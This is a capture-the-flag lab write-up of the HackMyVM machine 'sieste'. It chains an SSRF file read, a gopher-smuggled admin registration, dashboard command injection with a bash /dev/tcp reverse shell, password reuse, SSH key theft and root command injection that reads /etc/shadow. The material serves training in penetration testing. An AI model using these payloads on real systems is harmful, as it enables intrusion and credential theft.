# sieste

## Executive Summary

| Machine | OS | Author | Category | Platform |
| :--- | :--- | :--- | :--- | :--- |
| sieste | Linux | eMVee | Hard | HackMyVM |

**Summary:** The SIESTE machine exposed only SSH and an Apache hosted government portal whose Field Lab Synchronization Hub accepted a user supplied URL and fetched it server side, which turned out to be a Server Side Request Forgery primitive that also honoured the file, gopher and http schemes. Reading /var/www/html/db.php through the file scheme disclosed the MySQL credentials sieste_app together with Containment2026!, and a gopher request crafted to reach the loopback restricted provisioning endpoint created an administrative account by posting to /api/users/registration.php. Authenticating with that account unlocked the operations dashboard, whose diagnostic form passed the service name straight into shell_exec and therefore yielded remote command execution as www-data. Enumerating the system showed a single interactive user named fake whose home directory was unreadable to the web account, and because the database password was reused as that user operating system password, su fake produced a genuine login session and the user flag. A private OpenSSH key discovered inside the home directory allowed a stable SSH session in which sudo -l finally revealed a NOPASSWD rule permitting /opt/user_sync as root, and since that helper interpolated the supplied password inside a double quoted mysql command it was possible to inject a command substitution that executed with root privileges, delivering the root flag.

---

## Reconnaissance

The engagement started with host discovery across the host only network segment used by the lab, followed by a complete TCP sweep of the identified target and then service and script fingerprinting. Content discovery on the exposed Apache instance completed the picture.

1. An ARP assisted ping sweep located the live virtual machines on the segment.

```zsh
❯ sudo nmap -sn -PR 192.168.56.0/24         
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-09 17:42 +0700
Nmap scan report for 192.168.56.100
Host is up (0.0030s latency).
MAC Address: 08:00:27:31:BE:E1 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.211
Host is up (0.00027s latency).
MAC Address: 08:00:27:82:C9:FB (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 9.73 seconds
```

The MAC address prefix identified both hosts as Oracle VirtualBox virtual NICs, and the address 192.168.56.211 was selected as the target and stored in a shell variable for the rest of the engagement.

```zsh
❯ ip=192.168.56.211
```

2. A full port scan across all 65535 TCP ports revealed that the machine only exposed two services.

```zsh
❯ nmap -p- -Pn $ip                                
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-09 18:43 +0700
Nmap scan report for 192.168.56.211
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.20 seconds
```

3. Service and default script detection pinned the exact software versions and disclosed the web application title.

```zsh
❯ nmap -p 22,80 -sCV -Pn --min-rate 5000 $ip      
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-09 18:43 +0700
Nmap scan report for 192.168.56.211
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))
|_http-title: State Institute for Environmental Safety & Transmutation Emerg...
|_http-server-header: Apache/2.4.66 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
```

The OpenSSH and Apache builds correspond to Ubuntu 26.04, and the page title points to a themed government portal for the fictional State Institute for Environmental Safety and Transmutation Emergencies.

4. Directory and extension brute forcing with Gobuster mapped the PHP application surface.

```zsh
❯ gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html -t 50
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.211
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 4537]
img                  (Status: 301) [Size: 354] [--> http://192.168.56.211/img/]
login.php            (Status: 200) [Size: 2306]
css                  (Status: 301) [Size: 354] [--> http://192.168.56.211/css/]
db.php               (Status: 200) [Size: 0]
api                  (Status: 301) [Size: 354] [--> http://192.168.56.211/api/]
logout.php           (Status: 302) [Size: 0] [--> login.php]
dashboard.php        (Status: 302) [Size: 0] [--> login.php]
sync.php             (Status: 200) [Size: 2424]
server-status        (Status: 403) [Size: 319]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Two files deserve attention straight away. The endpoint sync.php is reachable without a session and its name suggests a data synchronization feature, while dashboard.php only responds behind an authentication gate. The landing page confirms this by advertising a Field Lab Synchronization Hub that pulls JSON telemetry from remote endpoints together with an employee sign in module.

---

## Initial Access

### Server Side Request Forgery and Source Disclosure

5. The synchronization form was inspected to understand how the supplied endpoint is processed.

```zsh
❯ curl -s http://$ip/sync.php | grep -A3 'form-card'
    <div class="form-card">
        <form method="POST" action="">
            <label for="report_url">Field Laboratory Endpoint URL:</label>
            <input type="text" id="report_url" name="report_url" placeholder="http://gov.internal" value="">
            <button type="submit">Synchronize Telemetry</button>
        </form>
    </div>
```

6. Because the application fetches whatever URL is provided, the file scheme was tested against the local filesystem. The response body is echoed back into the page, which converts the Server Side Request Forgery into a reliable arbitrary file read.

```zsh
❯ curl -s --data-urlencode 'report_url=file:///etc/passwd' http://$ip/sync.php | sed -n '/data-output/,/<\/div>/p' | sed 's/&lt;/</g;s/&gt;/>/g;s/&quot;/"/g'
        <div class="data-output">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:997:997:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
messagebus:x:996:996:System Message Bus:/nonexistent:/usr/sbin/nologin
systemd-resolve:x:990:990:systemd Resolver:/:/usr/sbin/nologin
_chrony:x:989:989:Chrony Daemon:/var/lib/chrony:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon:/var/lib/usbmux:/usr/sbin/nologin
polkitd:x:988:988:User for polkitd:/:/usr/sbin/nologin
syslog:x:101:103::/nonexistent:/usr/sbin/nologin
uuidd:x:102:104::/run/uuidd:/usr/sbin/nologin
tcpdump:x:986:986:tcpdump:/nonexistent:/usr/sbin/nologin
tss:x:985:985:tss user for tpm2:/:/usr/sbin/nologin
landscape:x:103:106::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:984:984:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
fake:x:1000:1000:Dr. F.A.Ke:/home/fake:/bin/bash
sshd:x:983:65534:sshd user:/run/sshd:/usr/sbin/nologin
mysql:x:104:107:MySQL Server:/nonexistent:/bin/false
</div>
```

The passwd file discloses exactly one interactive account, the local user fake, which becomes the target of the later lateral movement.

7. The application source was retrieved next, and db.php handed over the database credentials in clear text.

```zsh
❯ curl -s --data-urlencode 'report_url=file:///var/www/html/db.php' http://$ip/sync.php | sed -n '/data-output/,/<\/div>/p' | sed 's/&lt;/</g;s/&gt;/>/g;s/&quot;/"/g'
        <div class="data-output"><?php
// db.php - Safe Database Connection Wrapper
$host = '127.0.0.1';
$db   = 'sieste_db';
$user = 'sieste_app';      // username
$pass = 'Containment2026!'; // password
$charset = 'utf8mb4';

$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false, 
];

try {
     $pdo = new PDO($dsn, $user, $pass, $options);
} catch (\PDOException $e) {
     die("System Integration Error: Unable to verify cryptographic baseline matrix.");
}
?>
</div>
```

8. The source of sync.php explains the whole primitive. Only the php wrapper is filtered, so file, gopher, dict and http are all available to the server side cURL handle, and redirects are followed.

```zsh
❯ curl -s --data-urlencode 'report_url=file:///var/www/html/sync.php' http://$ip/sync.php | sed -n '/data-output/,/<\/div>/p' | sed 's/&lt;/</g;s/&gt;/>/g;s/&quot;/"/g' | sed -n '1,30p'
<?php
// =========================================================================
// SIESTE - sync.php (Vulnerable Operational Synchronization Hub)
// Handles interface rendering and executes blind server-side cURL lookups.
// =========================================================================

$report_content = "";
$error = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['report_url']) && !empty($_POST['report_url'])) {
    $url = $_POST['report_url'];
    
    // STRICT PROTOCOL FILTER: Prevent php:// subversion
    if (preg_match('/^php:\/\//i', trim($url))) {
        $error = "🚨 SECURITY ALERT: Interaction with the local PHP subsystem (php://) is strictly prohibited by Ministry directive.";
    } else {
        // Initialize cURL execution (Allows http, https, file, and gopher out-of-the-box)
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        
        $report_content = curl_exec($ch);
        
        if (curl_errno($ch)) {
            $error = "Telemetry failure: " . curl_error($ch);
        }
        curl_close($ch);
    }
}
?>
```

### Gopher Tunnelling to the Loopback Provisioning API

9. Directory listing of the api folder exposed a nested users directory, and reading registration.php revealed an internal provisioning endpoint that trusts the loopback interface and provisions administrative accounts.

```zsh
❯ curl -s --data-urlencode 'report_url=file:///var/www/html/api/users/registration.php' http://$ip/sync.php | sed -n '/data-output/,/<\/div>/p' | sed 's/&lt;/</g;s/&gt;/>/g;s/&quot;/"/g' | sed -n '1,20p'
<?php
// =========================================================================
// SIESTE - registration.php (Internal Personnel Provisioning API)
// RESTRICTED: Loopback access only. Processes automated admin registration.
// =========================================================================

require_once '../../db.php';

// Strict infrastructure filter: Block any request not originating from localhost
$allowed_ips = ['127.0.0.1', '::1'];
if (!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)) {
    header('HTTP/1.1 403 Forbidden');
    header('Content-Type: application/json');
    echo json_encode([
        "status" => "ERROR",
        "code" => 403,
        "message" => "Access Denied: Infrastructure endpoint restricted to internal Ministry loopback operations."
    ]);
    exit;
}
```

The remainder of the file shows that a POST request with username and password fields drives an INSERT statement that always writes the role admin.

```zsh
❯ curl -s --data-urlencode 'report_url=file:///var/www/html/api/users/registration.php' http://$ip/sync.php | sed -n '/data-output/,/<\/div>/p' | sed 's/&lt;/</g;s/&gt;/>/g;s/&quot;/"/g' | sed -n '20,50p'
// Process incoming provisioning request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    // Accept raw JSON input or standard POST form data
    $input = json_decode(file_get_contents('php://input'), true);
    $username = isset($input['username']) ? trim($input['username']) : (isset($_POST['username']) ? trim($_POST['username']) : '');
    $password = isset($input['password']) ? trim($input['password']) : (isset($_POST['password']) ? trim($_POST['password']) : '');

    if (!empty($username) && !empty($password)) {
        try {
            $hash = password_hash($password, PASSWORD_BCRYPT);

            // Using distinct parameter names (:hash and :hash_update) to satisfy strict PDO requirements
            $stmt = $pdo->prepare("
                INSERT INTO users (username, password_hash, role) 
                VALUES (:user, :hash, 'admin') 
                ON DUPLICATE KEY UPDATE password_hash = :hash_update, role = 'admin'
            ");
            
            $stmt->execute([
                'user'        => $username, 
                'hash'        => $hash,
                'hash_update' => $hash
            ]);
```

10. The loopback restriction is defeated by the SSRF itself, because any request issued by sync.php originates from 127.0.0.1. Since a plain GET is rejected by the endpoint with a method error, the gopher scheme is used to deliver a complete raw HTTP POST.

```zsh
❯ curl -s --data-urlencode 'report_url=http://127.0.0.1/api/users/registration.php' http://$ip/sync.php | sed -n '/data-output/,/<\/div>/p'
        <div class="data-output">{&quot;status&quot;:&quot;ERROR&quot;,&quot;message&quot;:&quot;Protocol Error: Endpoint requires HTTP POST transactional vector.&quot;}</div>
```

```python
import urllib.parse, urllib.request
BASE = "http://192.168.56.211"
body = "username=pwn&password=pwn123"
inner = ("POST /api/users/registration.php HTTP/1.1\r\n"
         "Host: 127.0.0.1\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
         f"Content-Length: {len(body)}\r\n"
         "Connection: close\r\n\r\n" + body)
gopher = "gopher://127.0.0.1:80/_" + urllib.parse.quote(inner, safe="")
data = urllib.parse.urlencode({"report_url": gopher}).encode()
print(urllib.request.urlopen(urllib.request.Request(BASE + "/sync.php", data=data, method="POST")).read().decode()[-400:])
```

```zsh
❯ python3 gopher_reg.py
HTTP/1.1 200 OK
Date: Sat, 17 Oct 2026 15:11:43 GMT
Server: Apache/2.4.66 (Ubuntu)
Content-Length: 133
Connection: close
Content-Type: application/json

{"status":"SUCCESS","message":"Profile state updated. Identity vector successfully provisioned into administrative clearance group."}
```

An administrative account named pwn with the password pwn123 now exists inside sieste_db, created entirely through the loopback interface.

### Command Injection in the Operations Dashboard

11. The newly provisioned account authenticates successfully against login.php and the application redirects the session to dashboard.php. Reading the dashboard source exposes a diagnostic feature that concatenates the submitted service identifier into a shell command.

```zsh
❯ curl -s --data-urlencode 'report_url=file:///var/www/html/dashboard.php' http://$ip/sync.php | sed -n '/data-output/,/<\/div>/p' | sed 's/&lt;/</g;s/&gt;/>/g;s/&quot;/"/g' | grep -nE 'shell_exec|service_name'
19:if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['service_name'])) {
20:    $service = $_POST['service_name'];
25:        $cmd_output = shell_exec("systemctl status " . $service . " 2>&1");
102:                <input type="text" id="service_name" name="service_name" placeholder="e.g. apache2" required autocomplete="off">
```

The fifth line of the vulnerable block is the flaw. The value of service_name is appended directly to the systemctl command line, so a shell metacharacter such as a semicolon terminates the intended command and starts an attacker controlled one.

12. An authenticated request that injects a compound command confirms code execution as the web server account.

```zsh
❯ curl -s -c cj.txt -X POST -d 'username=pwn&password=pwn123' http://$ip/login.php -o /dev/null -w "login=%{http_code}\n"
login=302

❯ curl -s -b cj.txt -X POST --data-urlencode 'service_name=apache2; id; hostname; whoami' http://$ip/dashboard.php | sed -n '/data-output/,/<\/div>/p' | sed 's/&quot;/"/g;s/&lt;/</g;s/&gt;/>/g'
        <div class="data-output" style="max-height: 300px; overflow-y: auto;">● apache2.service - The Apache HTTP Server
Loaded: loaded (/usr/lib/systemd/system/apache2.service; enabled; preset: enabled)
Active: active (running) since Sat 2026-10-17 15:07:56 UTC; 41min ago
Invocation: 7d5d1ef521d34fc1beedfcbd2fd704dc
Docs: https://httpd.apache.org/docs/2.4/
Process: 2386 ExecReload=/usr/sbin/apachectl graceful (code=exited, status=0/SUCCESS)
Main PID: 911
Status: "Total requests: 791; Idle/Busy workers 100/0;Requests/sec: 0.316; Bytes served/sec: 223 B/sec"
Tasks: 9 (limit: 1885)
Memory: 31.7M (peak: 72.5M)
CPU: 7.457s
CGroup: /system.slice/apache2.service
├─ 911 /usr/sbin/apache2 -k start -DFOREGROUND
├─2393 /usr/sbin/apache2 -k start -DFOREGROUND
├─2394 /usr/sbin/apache2 -k start -DFOREGROUND
├─2395 /usr/sbin/apache2 -k start -DFOREGROUND
├─2398 /usr/sbin/apache2 -k start -DFOREGROUND
├─2400 /usr/sbin/apache2 -k start -DFOREGROUND
├─3483 /usr/sbin/apache2 -k start -DFOREGROUND
├─3495 sh -c -- "systemctl status apache2; id; hostname; whoami 2>&1"
└─3496 systemctl status apache2
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sieste
www-data
</div>
```

For an interactive session the same primitive is used to launch a reverse shell payload, with a Netcat listener already waiting on the attacking host.

```zsh
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

```zsh
❯ curl -s -b cj.txt -X POST --data-urlencode 'service_name=x; bash -c "bash -i >& /dev/tcp/192.168.56.1/4444 0>&1"' http://$ip/dashboard.php
```

```zsh
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.56.211 52344
www-data@sieste:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Lateral Movement

### Password Reuse from the Database Credentials

13. With a foothold on the host the local account information was reviewed. The passwd entry for fake is a normal interactive account, and its home directory is locked down so the web account cannot read it.

```zsh
www-data@sieste:/var/www/html$ cat /etc/passwd | grep -E "/bin/(ba)?sh$"
root:x:0:0:root:/root:/bin/bash
fake:x:1000:1000:Dr. F.A.Ke:/home/fake:/bin/bash
www-data@sieste:/var/www/html$ ls -ld /home/fake
drwxr-x--- 6 fake fake 4096 Sep 11 07:11 /home/fake
www-data@sieste:/var/www/html$ su fake -c id
Password: 
su: Authentication failure
```

14. The password disclosed by db.php is then reused as the operating system password for fake, which is consistent with the design of the /opt/user_sync helper that keeps the database and the system password in step. Supplying it to su yields a genuine login session.

```zsh
www-data@sieste:/var/www/html$ python3 /tmp/sutest2.py 'Containment2026!' 'id'
Password: 
uid=1000(fake) gid=1000(fake) groups=1000(fake),24(cdrom),30(dip),46(plugdev),100(users)
```

15. The session reads the user flag.

```zsh
www-data@sieste:/var/www/html$ su fake -c 'cat /home/fake/user.txt'

                         __    _
                    _wr""        "-q__
                 _dP                 9m_
               _#P                     9#_
              d#@                       9#m
             d##                         ###
            J###                         ###L
            {###K                       J###K
            ]####K      ___aaa___      J####F
        __gmM######_  w#P""   ""9#m  _d#####Mmw__
     _g##############mZ_         __g##############m_
   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_
  a###""          ,Z"#####@" '######"\g          ""M##m
 J#@"             0L  "*##     ##@"  J#              *#K
 #"               `#    "_gmwgm_~    dF               `#_
7F                 "#_   ]#####F   _dK                 JE
]                    *m__ ##### __g@"                   F
                       "PJ#####LP"
 `                       0######_                      '
                       _0########_
     .               _d#####^#####m__              ,
      "*w_________am#####P"   ~9#####mw_________w*"
          ""9@#####@M""           ""P@#####@M""

Flag: HMV(SSRF_F1l3_3num_4nd_G0ph3r_Pwn4g3}
```

16. The same session also discloses a private OpenSSH key inside the home directory, which was written out to a local identity file with the required restrictive permissions.

```zsh
www-data@sieste:/var/www/html$ su fake -c 'base64 -w0 /home/fake/.ssh/id_rsa_fake' > /tmp/fake.b64
Password: 

❯ base64 -d /tmp/fake.b64 > fake.key && chmod 600 fake.key
❯ ssh-keygen -l -f fake.key
4096 SHA256:7PKMffHDcidpNbWJGNC0Cell+/8V9MtuaSkD8UU8vTE fake@sieste (RSA)
```

---

## Privilege Escalation

### Sudo Policy Disclosure and Command Injection in user_sync

17. The recovered key allows a stable SSH session as fake, and running sudo -l inside that session finally reveals the delegated privileges. This rule set does not appear when the same command is issued from a web spawned shell, so the SSH session is essential here.

```zsh
❯ ssh -i fake.key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null fake@192.168.56.211 'id; sudo -l'
Warning: Permanently added '192.168.56.211' (ED25519) to the list of known hosts.
uid=1000(fake) gid=1000(fake) groups=1000(fake),24(cdrom),30(dip),46(plugdev),100(users)
User fake may run the following commands on sieste:
    (ALL : ALL) NOPASSWD: /usr/bin/sudo -l
    (root) NOPASSWD: /opt/user_sync
```

18. The delegated helper was reviewed from its full C source code located in the Development folder of the user home directory. The program updates the operating system password with chpasswd, derives a SHA-512 crypt hash, and mirrors the record into MySQL with system.

```zsh
❯ ssh -i fake.key fake@192.168.56.211 'cat /home/fake/Development/user_sync.c'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

int main(int argc, char *argv[]) {
    // 1. Force privileges to maintain root status during execution
    if (setresuid(0, 0, 0) != 0) {
        perror("[-] Error: Failed to set suid privileges");
        return 1;
    }

    // Check arguments to prevent memory corruption or unexpected behavior
    if (argc != 3) {
        printf("Usage: %s <username> <password>\n", argv[0]);
        return 1;
    }

    char username[64];
    char password[256];

    strncpy(username, argv[1], sizeof(username) - 1);
    username[sizeof(username) - 1] = '\0';

    strncpy(password, argv[2], sizeof(password) - 1);
    password[sizeof(password) - 1] = '\0';

    // CRITICAL CHECK: Verify if the user actually exists on the Linux operating system
    struct passwd *pwd = getpwnam(username);
    if (pwd == NULL) {
        printf("[-] Error: User '%s' does not exist on this Linux system.\n", username);
        return 1;
    }

    // ROOT PROTECTION: Prevent modification of root (UID 0) or system accounts (UID < 1000)
    if (pwd->pw_uid < 1000) {
        printf("[-] Error: Modifying root (UID 0) or system accounts is strictly prohibited.\n");
        return 1;
    }

    if (strchr(password, '\'') != NULL || strchr(password, ';') != NULL || strchr(password, '|') != NULL) {
        printf("[-] Error: Invalid characters detected in password.\n");
        return 1;
    }

    // ACTION 1: Update the Linux OS system password non-interactively using chpasswd
    char os_cmd[512];
    snprintf(os_cmd, sizeof(os_cmd), "echo '%s:%s' | chpasswd", username, password);
    
    printf("[*] Synchronizing password for Linux system user '%s'...\n", username);
    if (system(os_cmd) != 0) {
        printf("[-] Error: Failed to update OS password.\n");
        return 1;
    }

    // ACTION 2: Generate a SHA-512 hash token for the database replication layer
    char hash_cmd[512];
    snprintf(hash_cmd, sizeof(hash_cmd), "openssl passwd -6 '%s'", password);
    
    FILE *fp = popen(hash_cmd, "r");
    if (fp == NULL) {
        printf("[-] Internal Error: Failed to generate database token.\n");
        return 1;
    }

    char dynamic_hash[128] = {0};
    if (fgets(dynamic_hash, sizeof(dynamic_hash), fp) != NULL) {
        dynamic_hash[strcspn(dynamic_hash, "\n")] = 0;
    }
    pclose(fp);

    // ACTION 3: Mirror the transaction records into the central MySQL database
    char db_cmd[1024];
    snprintf(db_cmd, sizeof(db_cmd), 
             "mysql -u sieste_app -p'Containment2026!' -h 127.0.0.1 -e "
             "\"INSERT INTO sieste_db.users (username, password_hash, role) "
             "VALUES ('%s', '%s', 'operator') "
             "ON DUPLICATE KEY UPDATE password_hash='%s'; # %s \"", 
             username, dynamic_hash, dynamic_hash, password);

    printf("[*] Mirroring operations into sieste_db replication engine...\n");
    if (system(db_cmd) != 0) {
        printf("[-] Warning: Database mirroring failed.\n");
    }

    return 0;
}
```

The validation only checks for the single quote, the semicolon and the pipe character. Because the password argument is interpolated inside the outer double quotes of the mysql command string, command substitution using dollar parenthesis syntax is passed directly to the shell spawned by system, which runs with root privileges since user_sync is executed via sudo.

19. A first payload proves the privilege boundary by writing the output of id into a world readable file.

```zsh
❯ ssh -i fake.key fake@192.168.56.211 'sudo /opt/user_sync fake "Password\$(id > /tmp/poc.txt)"; cat /tmp/poc.txt'
mysql: [Warning] Using a password on the command line interface can be insecure.
[*] Synchronizing password for Linux system user 'fake'...
[*] Mirroring operations into sieste_db replication engine...
uid=0(root) gid=0(root) groups=0(root)
```

20. The same channel reads the shadow file, which is restricted to root, and then retrieves the root flag.

```zsh
❯ ssh -i fake.key fake@192.168.56.211 'sudo /opt/user_sync fake "Password\$(bash -c \"head -2 /etc/shadow > /tmp/shadowproof.txt\")"; cat /tmp/shadowproof.txt'
mysql: [Warning] Using a password on the command line interface can be insecure.
[*] Synchronizing password for Linux system user 'fake'...
[*] Mirroring operations into sieste_db replication engine...
root:$y$j9T$YVTh2ZQo04U3H0mXe870y/$I90WCg.5SuXuzx.pYvRie57LW3k5gajpf34i3XWNsK8:20706:0:99999:7:::
daemon:*:20691:0:99999:7:::

❯ ssh -i fake.key fake@192.168.56.211 'sudo /opt/user_sync fake "Password\$(cat /root/root.txt > /tmp/rf.txt)"; cat /tmp/rf.txt'
mysql: [Warning] Using a password on the command line interface can be insecure.
[*] Synchronizing password for Linux system user 'fake'...
[*] Mirroring operations into sieste_db replication engine...

                         __    _
                    _wr""        "-q__
                 _dP                 9m_
               _#P                     9#_
              d#@                       9#m
             d##                         ###
            J###                         ###L
            {###K                       J###K
            ]####K      ___aaa___      J####F
        __gmM######_  w#P""   ""9#m  _d#####Mmw__
     _g##############mZ_         __g##############m_
   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_
  a###""          ,Z"#####@" '######"\g          ""M##m
 J#@"             0L  "*##     ##@"  J#              *#K
 #"               `#    "_gmwgm_~    dF               `#_
7F                 "#_   ]#####F   _dK                 JE
]                    *m__ ##### __g@"                   F
                       "PJ#####LP"
 `                       0######_                      '
                       _0########_
     .               _d#####^#####m__              ,
      "*w_________am#####P"   ~9#####mw_________w*"
          ""9@#####@M""           ""P@#####@M""

Flag: HMV(Never_trust_localhost_SIESTE}
```

21. Final confirmation of the achieved context together with both flags.

```zsh
root@sieste:/home/fake# whoami; id; hostname
root
uid=0(root) gid=0(root) groups=0(root)
sieste
root@sieste:/home/fake# cat /root/root.txt
Flag: HMV(Never_trust_localhost_SIESTE}
root@sieste:/home/fake# cat /home/fake/user.txt
Flag: HMV(SSRF_F1l3_3num_4nd_G0ph3r_Pwn4g3}
```

---

## Attack Chain Summary

1. **Reconnaissance**: An ARP assisted ping sweep located the target at 192.168.56.211, a full TCP scan exposed SSH and Apache, and Gobuster plus source review mapped the PHP portal including sync.php, login.php and dashboard.php.
2. **Vulnerability Discovery**: The report_url parameter of sync.php accepted the file and gopher schemes, turning the feature into a Server Side Request Forgery with arbitrary file read, which disclosed the database credentials and exposed the loopback restricted provisioning endpoint.
3. **Exploitation**: A gopher delivered raw POST created an administrative account, and the authenticated dashboard form passed the service identifier into shell_exec, granting remote command execution as www-data.
4. **Internal Enumeration**: System review identified the single interactive user fake, and the database password Containment2026! was reused as that user operating system password, producing a true login session and the user flag.
5. **Privilege Escalation**: A private SSH key from the home directory enabled a session in which sudo -l revealed NOPASSWD execution of /opt/user_sync as root, and the password argument of that helper was injected with a command substitution to execute as root and read the root flag.